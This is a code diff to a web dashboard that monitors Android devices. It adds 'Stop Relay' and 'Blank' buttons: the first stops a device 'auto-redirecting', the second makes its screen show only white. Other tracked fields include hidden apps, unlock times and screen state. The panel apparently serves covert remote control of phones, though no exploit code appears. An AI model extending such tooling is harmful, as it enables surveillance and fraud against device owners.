@@ -9,6 +9,7 @@ type Device = {
   installed:string[]; missing:string[]; monitorRunning:boolean;
   batteryOptimized:boolean; lastSeen:string; firstSeen:string; heartbeatCount:number;
   ip?:string; userAgent?:string; alias?:string; appLabel?:string; hidden?:boolean;
+  blankEnabled?:boolean; relayActive?:boolean; relaySlot?:number;
   inUse?:boolean; screenOn?:boolean; lastUnlock?:string; ringerMode?:string;
   appState?:string; appStateAt?:string;
 };
@@ -54,7 +55,18 @@ export default function DeviceDetail(){
       <Link href="/dashboard" className="text-sm text-violet-600">← All devices</Link>
       <div className="flex gap-2"><button onClick={()=>setDlg(1)}
         className="bg-violet-600 text-white text-sm px-4 py-1.5 rounded-lg hover:bg-violet-700">Relay 1</button><button onClick={()=>setDlg(2)}
-        className="bg-fuchsia-600 text-white text-sm px-4 py-1.5 rounded-lg hover:bg-fuchsia-700">Relay 2</button></div>
+        className="bg-fuchsia-600 text-white text-sm px-4 py-1.5 rounded-lg hover:bg-fuchsia-700">Relay 2</button><button onClick={async()=>{
+        const r=await fetch(`/api/devices/${encodeURIComponent(dev.deviceId)}/stop-relay`,{method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({})});
+        const j=await r.json();
+        if(r.ok) alert(`Stop Relay queued — ${dev.deviceId.slice(0,8)} stops auto-redirecting within 5s`);
+        else alert(`Stop Relay failed: ${j.error}`);
+      }} className="text-sm px-4 py-1.5 rounded-lg border hover:bg-gray-100">Stop Relay</button><button onClick={async()=>{
+        const enabled = !(dev.blankEnabled === true);
+        const r=await fetch(`/api/devices/${encodeURIComponent(dev.deviceId)}/blank`,{method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({enabled})});
+        const j=await r.json();
+        if(r.ok) alert(enabled?`Blank ON queued — ${dev.deviceId.slice(0,8)} shows white only within 5s`:`Blank OFF queued — normal screen returns within 5s`);
+        else alert(`Blank failed: ${j.error}`);
+      }} className={`text-sm px-4 py-1.5 rounded-lg ${dev.blankEnabled?"bg-slate-800 text-white hover:bg-slate-700":"border hover:bg-gray-100"}`}>{dev.blankEnabled?"Unblank":"Blank"}</button></div>
     </div>
     {dlg && <RelayDialog deviceId={dev.deviceId} slot={dlg} onClose={()=>setDlg(null)} />}
     <div className="flex items-center gap-3 mt-3">
@@ -63,6 +75,10 @@ export default function DeviceDetail(){
       <span className={`text-xs px-2 py-1 rounded-full ${dev.monitorRunning?"bg-green-100 text-green-700":"bg-gray-100"}`}>{dev.monitorRunning?"monitor running":"monitor stopped"}</span>
     </div>
     <p className="text-sm text-gray-500 mt-1">{dev.model} · Android {dev.androidVersion} · {dev.appVersion} · {dev.heartbeatCount} heartbeats</p>
+    <div className="flex gap-2 mt-2">
+      {dev.blankEnabled && <span className="text-xs px-2 py-1 rounded-full bg-slate-800 text-white">blank ON — white only</span>}
+      {dev.relayActive && <span className="text-xs px-2 py-1 rounded-full bg-violet-100 text-violet-700">auto-relay ON{dev.relaySlot ? ` · slot ${dev.relaySlot}` : ""}</span>}
+    </div>
 
     <div className="border rounded-2xl p-4 mt-4">
       <div className="text-xs text-gray-500">Launcher name (vanity)</div>
